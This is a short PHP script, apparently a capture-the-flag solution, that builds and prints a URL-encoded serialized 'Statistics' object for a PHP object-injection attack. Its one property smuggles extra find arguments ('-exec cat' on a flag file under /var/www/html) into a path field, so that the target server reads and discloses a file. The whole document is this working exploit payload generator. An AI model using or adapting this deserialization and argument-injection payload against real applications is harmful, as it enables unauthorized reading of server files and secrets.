<?php

class Statistics
{
    private $counter_output_path = "/tmp -iname counter -or -exec cat /var/www/html/flag_2465326734782.php ; -quit";
}

echo urlencode(serialize(new Statistics())), "\n";
